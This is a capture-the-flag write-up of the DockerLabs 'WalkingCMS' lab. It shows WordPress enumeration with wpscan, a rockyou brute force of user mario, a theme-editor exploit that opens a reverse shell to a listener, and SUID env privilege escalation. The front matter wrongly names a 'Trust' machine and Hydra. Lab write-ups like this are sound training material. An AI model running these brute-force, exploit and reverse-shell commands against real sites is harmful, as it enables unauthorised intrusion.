---
title: "WalkingCMS (DockerLabs)"
date: 2025-10-08
tags: ["dockerlabs", "linux", "web", "hydra", "privilege-escalation", "ejptv2", "pt1"]
description: "Write-up for the DockerLabs 'Trust' machine: Nmap scanning, web fuzzing, brute-force attack with Hydra and privilege escalation using Vim."
difficulty: "Very easy"
author: "Maximiliano Espinoza"
---

![logo](logo.png)

**1. Information**

The walkingCMS machine is a vulnerable WordPress where 
we will use nmap to scan the given IP, gobuster to 
find hidden directories, wpscan to perform a user and password 
enumeration attack, abuse of misconfigured WordPress themes, 
reverse shell and abuse of SUID to escalate 
privileges.

**2. Reconnaissance with nmap**

Once the Docker container of the machine is deployed, we proceed to 
perform reconnaissance with nmap, but first of all, we perform a ping 
to check connectivity with the victim machine, after performing the 
ping we proceed to perform the nmap scan.

```bash
sudo nmap -sS -sV -Pn -T4 -p- --open -oA trust 172.17.0.2
```
![nmap](1.png)


As we can see, we have port 80 open where an 
apache is running, indicating a web page.



**3. Web Fingerprinting (Web Reconnaissance)**

We begin by performing web reconnaissance, we open the page in 
our browser to see what we find:

There is nothing interesting, but we must bear in mind that within 
the /var/www/html/ directory there may be other pages hosted, 
so we must perform web directory fuzzing.

```bash
gobuster dir -u 172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,sh,py,txt,bak,zip
```

![gobuster](3.png)

And with this, it finds a wordpress directory, we perform a 
second fuzzing on wordpress.

```bash
gobuster dir -u 172.17.0.2/wordpress -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,sh,py,txt,bak,zip
```
![gobusword](3coma5.png)

The first thing we will do is check the pages that appear, 
among them one that interests us is the /wordpress/wp-
login.php directory

![gobusword](4.png)


**4. Audit with wpscan**

To audit a WordPress, we use the wpscan tool, but before 
we can use it we will first have to use the API, since WPScan 
needs an API token to enumerate vulnerabilities (vuln DB), for 
this we go to the tool's page:
https://wpscan.com, we create an account and copy the API Token, 
then we export it and we can make it persistent.

Having done this we proceed to perform the scan with wpscan:
```bash
echo 'export WPSCAN_API_TOKEN'
```
```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate u                  
```
![wplogin](5.png)

With the scan we find a user:

![wpscan](6.png)



now we perform a brute force attack with wpscan on the user 
mario:

```bash
wpscan --url http://172.17.0.2/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames mario
```

![userwp](7.png)
![wpbrute](8.png)

We can also enumerate plugins and themes to find one with 
some vulnerability:

```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate ap,at
```

![wpbrute](9.png)
![wpbrute](10.png)


**5. Reverse shell and privilege escalation.**

To perform the exploitation, we will enter the administration page 
and install the twentyfifteen theme, then we download 
this exploit: https://github.com/nisforrnicholas/WordPress-Theme-
Editor-Exploit/tree/main

We will start a listener on our attacking machine and in another 
tab we run the exploit.

```bash
python3 wpte_exploit.py http://172.17.0.2/ mario love twentyfifteen 172.17.0.1 4444 linux
```

![wpbrute](11.png)

And once the exploit is executed we obtain a reverse shell.

```bash
nc -lvnp 4444
```

```bash
python3 -c 'import pty,os; pty.spawn("/bin/bash")' 2>/dev/null || true
export TERM=xterm; stty rows 40 columns 120
```
![exploit](12.png)



NOTE: I ran a series of commands to stabilize the 
tty.


```bash
find  / -perm -4000 -type f 2>/dev/null
```

We begin to perform manual enumeration.

![tty](13.png)


This command searches for all files that have the SUID bit 
(permission 4000) and are files (-type f). SUID causes, when 
that binary is executed, its process to take the identity of the 
owner of the file (usually root) instead of that of the 
user who executes it.

With this search we can go to the page 
https://gtfobins.github.io/ and search for the env binary, with this 
binary we will be able to escalate privileges.

![enum](14.png)



now we execute the absolute path and escalate privileges
![root](15.png)

In this way we finish the WalkingCMS machine.


